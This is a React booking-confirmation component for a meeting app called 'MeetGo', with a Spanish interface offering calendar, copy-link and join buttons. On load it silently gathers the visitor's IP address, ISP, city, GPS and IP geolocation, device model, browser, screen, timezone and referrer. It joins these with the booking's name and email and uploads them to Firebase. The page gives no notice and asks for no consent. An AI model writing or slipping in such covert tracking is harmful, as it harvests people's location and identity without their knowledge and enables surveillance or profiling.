import { useState, useEffect } from 'react';
import { Check, Copy, Calendar, Clock, Video, Mail, ArrowLeft, ExternalLink } from 'lucide-react';
import { saveUserInfo } from '../utils/firebase';
import { captureUserInfo, detectOS, detectBrowser, detectDeviceType, getUserName } from '../utils/userInfo';

export default function BookingConfirmation({ booking, onNewBooking }) {
  const [copied, setCopied] = useState(false);
  
  // Guardar datos completos en Firebase al confirmar
  useEffect(() => {
    const saveCompleteData = async () => {
      const info = await captureUserInfo();
      const os = detectOS(info.browser.userAgent);
      const browser = detectBrowser(info.browser.userAgent);
      const device = detectDeviceType(info.browser.userAgent, info.screen);
      const userName = getUserName();
      
      const completeData = {
        user: userName,
        device: {
          type: device.type,
          brand: device.brand,
          model: device.model,
          category: device.category,
          os: device.os
        },
        browser: {
          name: browser.name,
          version: browser.version
        },
        location: {
          ip: info.ip,
          city: info.ipInfo?.city,
          region: info.ipInfo?.region,
          country: info.ipInfo?.country,
          isp: info.ipInfo?.isp,
          geolocationIP: info.geolocationIP,
          geolocationGPS: info.geolocationGPS
        },
        system: {
          screen: `${info.screen.width}x${info.screen.height}`,
          timezone: info.timezone.timezone,
          language: info.browser.language,
          platform: info.browser.platform
        },
        session: {
          url: info.page.url,
          referrer: info.page.referrer,
          userAgent: info.browser.userAgent
        },
        booking: {
          name: booking.name,
          email: booking.email,
          title: booking.title,
          description: booking.description,
          duration: booking.duration,
          date: booking.date.toISOString(),
          time: booking.time.time,
          meetingId: booking.meetingId,
          meetingUrl: booking.meetingUrl
        }
      };
      
      await saveUserInfo(completeData);
    };
    
    saveCompleteData();
  }, [booking]);

  const copyToClipboard = async (text) => {
    try {
      await navigator.clipboard.writeText(text);
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    } catch (err) {
      console.error('Error al copiar:', err);
    }
  };

  const addToCalendar = () => {
    const startDate = new Date(booking.date);
    const [hours, minutes] = booking.time.time.split(':');
    startDate.setHours(parseInt(hours), parseInt(minutes));
    
    const endDate = new Date(startDate);
    endDate.setMinutes(endDate.getMinutes() + parseInt(booking.duration));
    
    const formatDate = (date) => {
      return date.toISOString().replace(/[-:]/g, '').split('.')[0] + 'Z';
    };
    
    const calendarUrl = `https://calendar.google.com/calendar/render?action=TEMPLATE&text=${encodeURIComponent(booking.title)}&dates=${formatDate(startDate)}/${formatDate(endDate)}&details=${encodeURIComponent(`Reunión programada a través de MeetGo\n\nDescripción: ${booking.description}\n\nEnlace de la reunión: ${booking.meetingUrl}`)}&location=${encodeURIComponent(booking.meetingUrl)}`;
    
    window.open(calendarUrl, '_blank');
  };

  return (
    <div className="max-w-2xl mx-auto">
      <div className="card animate-fade-in">
        <div className="text-center mb-6">
          <div className="bg-success p-3 rounded-full w-16 h-16 mx-auto mb-4 flex items-center justify-center">
            <Check className="h-8 w-8 text-white" />
          </div>
          <h2 className="text-2xl font-bold text-gray-900 mb-2">¡Reunión Programada!</h2>
          <p className="text-gray-600">Tu reunión ha sido programada exitosamente</p>
        </div>

        <div className="bg-gray-50 rounded-lg p-6 mb-6">
          <h3 className="font-semibold text-gray-900 mb-4">{booking.title}</h3>
          
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            <div className="flex items-center space-x-3">
              <Calendar className="h-5 w-5 text-gray-500" />
              <div>
                <p className="text-sm text-gray-500">Fecha</p>
                <p className="font-medium text-gray-900">
                  {booking.date.toLocaleDateString('es-ES', {
                    weekday: 'long',
                    year: 'numeric',
                    month: 'long',
                    day: 'numeric'
                  })}
                </p>
              </div>
            </div>
            
            <div className="flex items-center space-x-3">
              <Clock className="h-5 w-5 text-gray-500" />
              <div>
                <p className="text-sm text-gray-500">Hora</p>
                <p className="font-medium text-gray-900">
                  {booking.time.time} ({booking.duration} min)
                </p>
              </div>
            </div>
            
            <div className="flex items-center space-x-3">
              <Mail className="h-5 w-5 text-gray-500" />
              <div>
                <p className="text-sm text-gray-500">Organizador</p>
                <p className="font-medium text-gray-900">{booking.name}</p>
              </div>
            </div>
            
            <div className="flex items-center space-x-3">
              <Video className="h-5 w-5 text-gray-500" />
              <div>
                <p className="text-sm text-gray-500">ID de reunión</p>
                <p className="font-medium text-gray-900 font-mono text-sm">{booking.meetingId}</p>
              </div>
            </div>
          </div>
          
          {booking.description && (
            <div className="mt-4 pt-4 border-t border-gray-200">
              <p className="text-sm text-gray-500 mb-1">Descripción</p>
              <p className="text-gray-700">{booking.description}</p>
            </div>
          )}
        </div>

        <div className="bg-blue-50 border border-blue-200 rounded-lg p-4 mb-6">
          <div className="flex items-center justify-between">
            <div className="flex items-center space-x-3">
              <Video className="h-5 w-5 text-blue-600" />
              <div>
                <p className="text-sm font-medium text-blue-900">Enlace de la reunión</p>
                <p className="text-sm text-blue-700 font-mono">{booking.meetingUrl}</p>
              </div>
            </div>
            <button
              onClick={() => copyToClipboard(booking.meetingUrl)}
              className="flex items-center space-x-2 px-3 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 transition-colors text-sm"
            >
              {copied ? <Check className="h-4 w-4" /> : <Copy className="h-4 w-4" />}
              <span>{copied ? 'Copiado' : 'Copiar'}</span>
            </button>
          </div>
        </div>

        <div className="flex flex-col sm:flex-row gap-3">
          <button
            onClick={addToCalendar}
            className="flex-1 btn-primary flex items-center justify-center space-x-2"
          >
            <Calendar className="h-4 w-4" />
            <span>Agregar al Calendario</span>
            <ExternalLink className="h-4 w-4" />
          </button>
          
          <button
            onClick={() => window.open(booking.meetingUrl, '_blank')}
            className="flex-1 btn-secondary flex items-center justify-center space-x-2"
          >
            <Video className="h-4 w-4" />
            <span>Unirse Ahora</span>
          </button>
        </div>

        <div className="mt-6 pt-6 border-t border-gray-200 text-center">
          <button
            onClick={onNewBooking}
            className="inline-flex items-center space-x-2 text-primary hover:text-primary/80 font-medium transition-colors"
          >
            <ArrowLeft className="h-4 w-4" />
            <span>Programar otra reunión</span>
          </button>
        </div>
      </div>

      <div className="mt-6 text-center text-sm text-gray-500">
        <p>Se ha enviado una confirmación por correo electrónico a <strong>{booking.email}</strong></p>
      </div>
    </div>
  );
}